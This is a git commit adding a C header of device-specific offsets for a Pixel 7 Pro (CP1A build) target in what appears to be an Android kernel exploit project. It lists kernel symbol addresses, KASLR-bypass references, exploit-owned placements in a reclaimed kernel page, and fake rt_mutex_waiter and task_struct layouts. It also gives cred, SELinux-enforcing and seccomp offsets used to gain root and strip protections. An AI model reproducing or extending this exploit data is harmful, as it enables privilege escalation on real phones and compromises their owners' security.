38609a76c77959595518f03e2c5f57f18f3e6cd4
Aidan Leuenberger <aidanml05@gmail.com>
2026-08-03 21:55:43 -0500

    feat: add Pixel 7 Pro CP1A target

---
+++ src/targets/cheetah-CP1A.260405.005/target.h
@@ -0,0 +1,212 @@
+/*
+ * Pixel 7 Pro (cheetah), CP1A.260405.005.
+ *
+ * Kernel: 6.1.145-android14-11-gfa1d6308d1fe-ab14691759
+ * GKI build: ab14691759, revision fa1d6308d1fe
+ *
+ * Symbol and structure offsets were extracted from the exact unstripped GKI.
+ */
+
+#ifndef OFFSET_H
+#define OFFSET_H
+
+#define BUILD_VARIANT_LABEL "cheetah_CP1A260405005"
+#define BUILD_FINGERPRINT \
+  "google/cheetah/cheetah:16/CP1A.260405.005/15001963:user/release-keys"
+
+/* Memory layout. */
+
+#define KIMAGE_TEXT_BASE        0xffffffc008000000ULL
+#define P0_PAGE_OFFSET          0xffffff8000000000ULL
+#define P0_PHYS_OFFSET          0x80000000ULL
+#define P0_KERNEL_PHYS_LOAD     0x80010000ULL
+#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL
+#define DIRECT_MAP_BASE         0xffffff8000000000ULL
+#define DIRECT_MAP_END          0xffffff9000000000ULL
+#define VMEMMAP_START           0xfffffffe00000000ULL
+
+/* Kernel symbol offsets from KIMAGE_TEXT_BASE. */
+
+#define ASHMEM_MISC_FOPS_OFF        0x0216c080ULL
+#define ASHMEM_FOPS_OFF             0x0127fe88ULL
+#define ASHMEM_IOCTL_OFF            0x00c322c8ULL
+#define ASHMEM_COMPAT_IOCTL_OFF     0x00c32c00ULL
+#define ASHMEM_MMAP_OFF             0x00c32c58ULL
+#define ASHMEM_OPEN_OFF             0x00c32e78ULL
+#define ASHMEM_RELEASE_OFF          0x00c32f00ULL
+#define ASHMEM_SHOW_FDINFO_OFF      0x00c33020ULL
+
+#define CONFIGFS_READ_ITER_OFF      0x004637e0ULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00463d10ULL
+#define COPY_SPLICE_READ_OFF        0x003e57c0ULL
+#define NOOP_LLSEEK_OFF             0x00397fc0ULL
+
+#define INIT_TASK_OFF               0x0200f600ULL
+#define ROOT_TASK_GROUP_OFF         0x021f7580ULL
+
+#define SELINUX_BLOB_SIZES_OFF      0x015cc608ULL
+#define SELINUX_ENFORCING_OFF       0x02249400ULL
+#define SECURITY_HOOK_HEADS_OFF     0x015cbef8ULL
+
+#define KMALLOC_CACHES_OFF          0x015cba38ULL
+#define ANON_PIPE_BUF_OPS_OFF       0x011091d0ULL
+
+/* KASLR stage-zero references. */
+
+#define SLIDE_NFULNL_LOGGER_OFF         0x020029c8ULL
+#define SLIDE_LOGGERS_0_1_OFF           0x02002938ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF   0x021274c8ULL
+#define SLIDE_INIT_TASK_OFF             INIT_TASK_OFF
+#define SLIDE_ROOT_TASK_GROUP_OFF       ROOT_TASK_GROUP_OFF
+#define SLIDE_SYSCTL_BOOTID_OFF         0x0226a498ULL
+
+/* Full image addresses used by common.h. */
+
+#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
+#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
+#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
+#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
+#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
+#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
+#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
+#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
+#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
+#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
+#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
+#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
+#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
+#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
+#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
+#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+
+#define SLIDE_NFULNL_LOGGER_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
+#define SLIDE_LOGGERS_0_1_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
+#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
+#define SLIDE_ROOT_TASK_GROUP_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
+#define SLIDE_SYSCTL_BOOTID_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+
+/* Exploit-owned placements within the reclaimed kernel page. */
+
+#define LOCK_OFF        0x1350
+#define W0_OFF          0x2220
+#define FOPS_OFF        0x1000
+#define SCRATCH_OFF     0x3000
+#define RIGHT_OFF       0x4440
+#define LEFT_OFF        0x5550
+#define FAKE_TASK_OFF   0x3200
+
+/* struct rt_mutex_waiter. */
+
+#define WAITER_LOCAL_OFF             0x80
+#define WAITER_TREE_ENTRY_OFF        0x00
+#define WAITER_PI_TREE_ENTRY_OFF     0x18
+#define WAITER_TASK_OFF              0x30
+#define WAITER_LOCK_OFF              0x38
+#define WAITER_WAKE_STATE_OFF        0x40
+#define WAITER_PRIO_OFF              0x44
+#define WAITER_DEADLINE_OFF          0x48
+#define WAITER_WW_CTX_OFF            0x50
+
+#define FAKE_WAITER_TREE_PRIO_OFF       0x44
+#define FAKE_WAITER_TREE_DEADLINE_OFF   0x48
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
+#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x44
+#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
+#define FAKE_WAITER_TASK_OFF            0x30
+#define FAKE_WAITER_LOCK_OFF            0x38
+#define FAKE_WAITER_WAKE_STATE_OFF      0x40
+#define FAKE_WAITER_WW_CTX_OFF          0x50
+
+/* struct task_struct. */
+
+#define FAKE_TASK_USAGE_OFF          0x40
+#define FAKE_TASK_PRIO_OFF           0x84
+#define FAKE_TASK_NORMAL_PRIO_OFF    0x8c
+#define FAKE_TASK_TASK_GROUP_OFF     0x348
+#define FAKE_TASK_PI_LOCK_OFF        0x924
+#define FAKE_TASK_PI_WAITERS_OFF     0x938
+#define FAKE_TASK_PI_TOP_TASK_OFF    0x948
+#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x950
+
+#define TASK_PID_OFF                 0x630
+#define TASK_TGID_OFF                0x634
+#define TASK_REAL_PARENT_OFF         0x640
+#define TASK_ATOMIC_FLAGS_OFF        0x5f0
+#define TASK_REAL_CRED_OFF           0x830
+#define TASK_CRED_OFF                0x838
+#define TASK_COMM_OFF                0x848
+#define TASK_TASKS_OFF               0x550
+#define TASK_THREAD_INFO_FLAGS_OFF   0x00
+#define TASK_SECCOMP_OFF             0x900
+
+/* struct cred. */
+
+#define CRED_UID_OFF             4
+#define CRED_SECUREBITS_OFF      36
+#define CRED_CAPS_OFF            40
+#define CRED_SECURITY_OFF        120
+
+/* SELinux cred blob. */
+
+#define SELINUX_CRED_BLOB_OFF    0
+#define SELINUX_CRED_OSID_OFF    0
+#define SELINUX_CRED_SID_OFF     4
+
+/* struct configfs_buffer. */
+
+#define CFG_PAGE_OFF             16
+#define CFG_NEEDS_READ_FILL_OFF  80
+#define CFG_BIN_BUFFER_OFF       88
+#define CFG_BIN_BUFFER_SIZE_OFF  96
+#define CFG_CB_MAX_SIZE_OFF      100
+
+/* mm and page layouts. */
+
+#define MM_OWNER_OFF             824
+
+#define STRUCT_PAGE_SIZE               0x40
+#define STRUCT_PAGE_COMPOUND_HEAD_OFF  0x08
+#define STRUCT_SLAB_CACHE_OFF          0x18
+#define STRUCT_PAGE_TYPE_OFF           0x30
+
+/* struct pipe_buffer. */
+
+#define PIPE_BUFFER_SIZE         0x28
+#define PIPE_BUFFER_SLOTS        32
+#define PIPE_BUF_FLAG_CAN_MERGE  0x10
+
+/* struct file_operations. */
+
+#define FOPS_OWNER_OFF           0x00
+#define FOPS_LLSEEK_OFF          0x08
+#define FOPS_READ_OFF            0x10
+#define FOPS_WRITE_OFF           0x18
+#define FOPS_READ_ITER_OFF       0x20
+#define FOPS_WRITE_ITER_OFF      0x28
+#define FOPS_IOCTL_OFF           0x50
+#define FOPS_COMPAT_IOCTL_OFF    0x58
+#define FOPS_MMAP_OFF            0x60
+#define FOPS_OPEN_OFF            0x70
+#define FOPS_RELEASE_OFF         0x80
+#define FOPS_SPLICE_READ_OFF     0xc8
+#define FOPS_SHOW_FDINFO_OFF     0xe0
+
+/* struct seccomp and architecture flag bits. */
+
+#define SECCOMP_MODE_OFF         0x00
+#define SECCOMP_FILTER_COUNT_OFF 0x04
+#define SECCOMP_FILTER_OFF       0x08
+#define TIF_SECCOMP_BIT          11
+#define PFA_NO_NEW_PRIVS_BIT     0
+
+#endif /* OFFSET_H */
